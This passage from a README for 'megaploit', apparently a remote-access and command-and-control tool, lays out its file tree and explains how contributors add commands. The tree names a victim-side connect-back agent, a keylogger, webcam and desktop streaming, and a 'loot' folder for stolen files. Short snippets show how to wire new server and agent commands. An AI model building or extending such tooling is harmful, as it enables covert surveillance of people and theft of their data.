├── secret.key                       HMAC shared secret (generate manually)
├── cert.pem / key.pem               TLS certificate and key (optional)
│
├── plugins/                         Community plugin files
│   └── example.toml                 Documented example covering all three command kinds
│
├── tools/                           Toolbox — cloned repos land here
│   └── tools.json                   Persistent tool catalogue
│
├── loot/                            All collected files
│   ├── screenshots/
│   ├── recordings/
│   └── downloads/
│
├── saved_model/                     Optional: DNN face-detection model for webcam
│   ├── deploy.prototxt.txt
│   └── res10_300x300_ssd_iter_140000.caffemodel
│
└── megaploit/
    ├── __init__.py                  Package root (version string)
    ├── core/
    │   ├── config.py                Shared constants
    │   ├── crypto.py                HMAC authentication
    │   └── protocol.py             send_msg / recv_msg / send_file / recv_file
    ├── server/
    │   ├── cli.py                   Interactive console (main server file)
    │   ├── commands.py              @_cmd decorated command registry
    │   ├── listener.py              TCP accept loop + TLS + auth
    │   └── session.py               Session dataclass
    ├── agent/
    │   ├── connection.py            Connect-back loop (LHOST/PORT/USE_TLS patched here)
    │   ├── handlers.py              All victim-side command handlers
    │   ├── keylogger.py             pynput keystroke logger
    │   └── shell.py                 recv → execute → respond loop
    ├── streaming/
    │   ├── screen.py                Camera class (mss + OpenCV, ~30fps)
    │   ├── desktop.py               Flask MJPEG desktop stream (:5000)
    │   ├── webcam.py                Flask MJPEG webcam stream (:5001)
    │   └── templates/
    │       ├── desktop.html
    │       └── webcam.html
    ├── toolbox/
    │   ├── registry.py              Tool dataclass + ToolRegistry (tools.json)
    │   ├── installer.py             Multi-language build system
    │   ├── runner.py                Local + remote execution per language
    │   └── updater.py               Background git update checker
    └── plugins/
        ├── schema.py                Plugin + PluginCommand dataclasses + TOML parser
        ├── loader.py                PluginLoader — scans plugins/*.toml
        └── runner.py                Executes plugin commands (local/session/python)
```

---

## Contributing

### Adding a Built-in Server Command

Register a new handler in [`megaploit/server/commands.py`](megaploit/server/commands.py):

```python
@_cmd("mycommand", usage="mycommand <arg>", help_text="Does something useful")
def cmd_mycommand(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: mycommand <arg>")
    send_msg(session.conn, f"mycommand {args[0]}")
    return _ok(recv_msg(session.conn))
```

Add the corresponding handler on the agent side in [`megaploit/agent/handlers.py`](megaploit/agent/handlers.py):

```python
@_register("mycommand")
def _mycommand(conn, args: list[str]) -> str:
    return f"[+] Got: {args[0]}"
```

### Adding a Plugin (No Python Required)

Create `plugins/myplugin.toml` — see [`plugins/example.toml`](plugins/example.toml) for the full annotated reference.

### Adding a Toolbox Tool

```
megaploit > toolbox install https://github.com/user/repo toolname "description" --tags tag1,tag2
```

No code changes required. The installer handles any supported language automatically.

### Code Style

- Python 3.10+ type hints throughout
- `from __future__ import annotations` in every module
- `@dataclass` for all data structures
- No global mutable state outside of the module-level singletons (`registry`, `plugin_loader`)
- Every public function/class has a docstring
- ANSI colour output via the `_c()` helper in `cli.py`; no colour in library modules
